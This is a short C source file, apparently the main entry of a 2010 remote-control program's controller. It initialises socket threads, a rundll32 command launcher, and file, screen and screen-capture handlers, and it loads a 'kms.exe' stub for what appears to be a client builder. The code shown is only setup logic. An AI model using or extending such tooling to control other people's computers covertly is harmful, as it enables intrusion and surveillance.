/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "km_head.h"
#include "km_socket.h"
#include "main_frame.h"
#include "module_manger.h"
#include "main_frame_event.h"
#include "m_frame_file_event.h"
#include "m_frame_screen_event.h"
#include "m_frame_cap_screen_event.h"
#include "main_frame_log.h"
#include "m_make_center.h"

#include "ip_info.h"
#include "file.h"

unsigned long TSyssize;
char * TSysbuff;
long g_totalline = 0;
long g_lineport = 2010;
long g_cmdport = 100;

int
main_initialize()
{
    char *temp_malloc,*find;
    char sys_path[MAX_PATH] =  {0};

    hInst = GetModuleHandle(NULL);

    g_share_main = malloc(sizeof(share_main));
    memset(g_share_main, 0x0, sizeof(share_main));

    InitializeCriticalSection(&g_share_main->critical_section);

    g_share_main->sock_loop_thread_count = 4;
    g_share_main->sock_loop_thread = malloc(sizeof(HANDLE) * g_share_main->sock_loop_thread_count);

    g_share_main->c_ver.wVersion = 0x1013;
    //g_share_main->c_ver.wSystemVersion = get_oversion();
    //g_share_main->c_ver.c_type = 0x2;

    temp_malloc = malloc(MAX_PATH);
    memset(temp_malloc, 0x0, MAX_PATH);
    GetModuleFileName(NULL, temp_malloc, MAX_PATH);
    find = strrchr(temp_malloc, '\\');
    find ++;
    *find = '\0';
    g_share_main->km_cur_path = temp_malloc;

    temp_malloc = malloc(MAX_PATH);
    memset(temp_malloc, 0x0, MAX_PATH);
    sprintf(temp_malloc, "%smod\\", g_share_main->km_cur_path);
    g_share_main->km_mod_path = temp_malloc;

    temp_malloc = malloc(MAX_PATH);
    memset(temp_malloc, 0x0, MAX_PATH);
    sprintf(temp_malloc, "rundll32 SHELL32.DLL,ShellExec_RunDLL %s%s", g_share_main->km_cur_path, "exec_cmd.exe");
    g_share_main->km_cmd_exec = temp_malloc;

    sprintf(sys_path, "%skms.exe" ,g_share_main->km_cur_path);
    TSysbuff = file_read(sys_path, &TSyssize);

    make_config_initialize();

    initialize_km_main_event();
    initialize_km_file_event();
    initialize_km_screen_event();
    initialize_km_cap_screen_event();
    return 1;
}

int main()
{
    main_initialize();
    module_initialize();
    initialize_ip_info();

    kms_main_initialize();

    initialize_main_frame();

    //WaitForSingleObject(g_share_main->sock_loop_thread[0], INFINITE);
    return 0;
}
